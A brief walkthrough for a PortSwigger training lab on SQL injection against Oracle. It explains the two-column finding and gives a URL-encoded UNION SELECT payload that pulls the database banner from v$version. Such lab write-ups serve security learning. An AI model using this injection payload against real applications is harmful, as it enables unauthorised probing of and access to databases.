## SQL injection attack, querying the database type and version on Oracle

The lab asks to retreive the version and type of the Oracle DB in this format
```
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production, PL/SQL Release 11.2.0.2.0 - Production, CORE 11.2.0.2.0 Production, TNS for Linux: Version 11.2.0.2.0 - Production, NLSRTL Version 11.2.0.2.0 - Production
```

The categories are retreiving 2 data `Title` and `Paragraph` with the content, which indicates that there are 2 columns being query. For the solution inject the next sql code:

```sql
 %27+UNION+SELECT+null,banner+FROM+v$version--
```

Injecting a union query with the `banner` which retrieves `type` and `version` of the Oracle database `v$version`. 

[Lab](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle)